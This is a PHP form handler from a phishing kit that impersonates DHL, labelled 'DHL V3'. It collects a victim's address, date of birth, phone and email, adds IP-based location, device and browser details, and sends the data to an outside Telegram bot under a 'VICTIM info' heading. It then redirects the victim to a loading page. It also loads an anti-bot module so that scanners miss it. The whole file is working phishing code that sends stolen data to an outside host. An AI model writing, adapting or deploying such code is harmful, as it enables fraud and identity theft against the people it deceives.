<?php

session_start();

include '../../config.php';
include '../../antibots/index.php';

include '../functions.php';
$TIME = date("d/m/Y");
$ip = $_SERVER['REMOTE_ADDR'];
get_user_ipinfo($ip);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['BotToken'] = $BotToken;
$_SESSION['ChatId'] = $ChatId;
$os_plat = getOS($user_agent);
$browser = getBrowser();

if (($_POST['adress'] != "") AND ($_POST['city'] != "") AND ($_POST['state'] != "")) {
    $_SESSION['adress'] = $_POST['adress'];
    $_SESSION['city'] = $_POST['city'];
    $_SESSION['state'] = $_POST['state'];
    $_SESSION['birt'] = $_POST['birt'];
    $_SESSION['zip'] = $_POST['zip'];
    $_SESSION['phone'] = $_POST['phone'];
    $_SESSION['email'] = $_POST['email'];



    $address = $_POST['adress'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $birt = $_POST['birt'];
    $zip = $_POST['zip'];
    $phone = $_POST['phone'];
    $emailvic = $_POST['email'];


    $Message_rzlt = "
    📦 ━━━━━━━━━━━━ 📦
    VICTIM Billing info:
    Country:  ` $countryy `
    Address: `$address`
    City: `$city`
    State: `$state`
    Zip: `$zip`
    ━━━━━━━━━━━━
    VICTIM info:
    Email: `$emailvic`
    Phone: `$phone`
    DOB: `$birt`
    ━━━━━━━━━━━━
    VICTIM IP info:
    IP: `$ip`
    IPcountry: $countryy - $country_code
    Region: $regionn
    Telecom: $isp
    Time: $TIME
    Device: $os_plat - $browser
    📦 ━━━━━━━━━━━━ 📦
    🃏 DHL V3 by  🃏";


    sendMessage($ChatId, $Message_rzlt, $BotToken);



    header('location: ../loading_1.php');

}






?>